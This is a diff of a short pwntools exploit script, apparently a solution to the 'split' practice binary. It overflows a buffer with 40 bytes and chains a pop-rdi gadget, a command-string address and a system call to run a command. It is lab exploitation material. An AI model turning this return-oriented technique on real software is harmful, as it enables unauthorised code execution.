@@ -1,12 +1,15 @@
 from pwn import *
 
-#pr = process("./split")
+pr = process("./split")
 
-payload = "A"*40
-usefulFunction = p64(0x00400742)
+payload = b"A"*40
+systemCall = p64(0x40074b)
+cat = p64(0x601065)
+pop_rdi = p64(0x4007c3)
+ret = p64(0x40053e)
 
-payload += usefulFunction
+payload += systemCall + ret + pop_rdi + cat + systemCall
 
-#pr.sendline(payload)
+pr.sendline(payload)
 
-print(payload)
+print(pr.recvall().decode())
